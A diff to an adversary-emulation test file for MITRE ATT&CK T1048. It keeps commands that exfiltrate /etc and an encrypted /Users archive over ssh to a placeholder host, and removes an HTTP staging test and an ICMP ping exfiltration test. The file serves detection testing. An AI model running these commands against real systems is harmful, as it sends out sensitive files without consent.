@@ -1,57 +1,38 @@
----
 attack_technique: T1048
 display_name: Exfiltration Over Alternative Protocol
-
 atomic_tests:
 - name: Exfiltration Over Alternative Protocol - SSH
+  auto_generated_guid: f6786cc8-beda-4915-a4d6-ac2f193bb988
   description: |
     Input a domain and test Exfiltration over SSH
 
     Remote to Local
 
+    Upon successful execution, sh will spawn ssh contacting a remote domain (default: target.example.com) writing a tar.gz file.
   supported_platforms:
-    - macos
-    - centos
-    - ubuntu
-    - linux
-
+  - macos
+  - linux
   input_arguments:
     domain:
       description: target SSH domain
       type: url
       default: target.example.com
-    user_name:
-      description: username for domain
-      type: string
-      default: atomic
-    password:
-      description: password for user
-      type: string
-      default: atomic
-
   executor:
-    name: sh
-    elevation_required: false
     command: |
       ssh #{domain} "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz
-
+    name: sh
 - name: Exfiltration Over Alternative Protocol - SSH
+  auto_generated_guid: 7c3cb337-35ae-4d06-bf03-3032ed2ec268
   description: |
     Input a domain and test Exfiltration over SSH
 
     Local to Remote
 
+    Upon successful execution, tar will compress /Users/* directory and password protect the file modification of `Users.tar.gz.enc` as output.
   supported_platforms:
-    - macos
-    - centos
-    - ubuntu
-    - linux
-
+  - macos
+  - linux
   input_arguments:
-    domain:
-      description: target SSH domain
-      type: url
-      default: target.example.com
     user_name:
       description: username for domain
       type: string
@@ -60,59 +41,11 @@ atomic_tests:
       description: password for user
       type: string
       default: atomic
-
+    domain:
+      description: target SSH domain
+      type: url
+      default: target.example.com
   executor:
-    name: sh
-    elevation_required: false
     command: |
       tar czpf - /Users/* | openssl des3 -salt -pass #{password} | ssh #{user_name}@#{domain} 'cat > /Users.tar.gz.enc'
-
-- name: Exfiltration Over Alternative Protocol - HTTP
-  description: |
-    A firewall rule (iptables or firewalld) will be needed to allow exfiltration on port 1337.
-
-  supported_platforms:
-    - macos
-    - centos
-    - ubuntu
-    - linux
-
-  executor:
-    name: manual
-    steps: |
-      1. Victim System Configuration:
-
-          mkdir /tmp/victim-staging-area
-          echo "this file will be exfiltrated" > /tmp/victim-staging-area/victim-file.txt
-
-      2. Using Python to establish a one-line HTTP server on victim system:
-
-          cd /tmp/victim-staging-area
-          python -m SimpleHTTPServer 1337
-
-      3. To retrieve the data from an adversary system:
-
-          wget http://VICTIM_IP:1337/victim-file.txt
-
-- name: Exfiltration Over Alternative Protocol - ICMP
-  description: |
-    Exfiltration of specified file over ICMP protocol.
-
-  supported_platforms:
-    - windows
-
-  input_arguments:
-    input_file:
-      description: Path to file to be exfiltrated.
-      type: Path
-      default: C:\Windows\System32\notepad.exe
-    ip_address:
-      description: Destination IP address where the data should be sent.
-      type: String
-      default: 127.0.0.1
-
-  executor:
-    name: powershell
-    elevation_required: false
-    command: |
-      $ping = New-Object System.Net.Networkinformation.ping; foreach($Data in Get-Content -Path #{input_file} -Encoding Byte -ReadCount 1024) { $ping.Send("#{ip_address}", 1500, $Data) }
+    name: sh
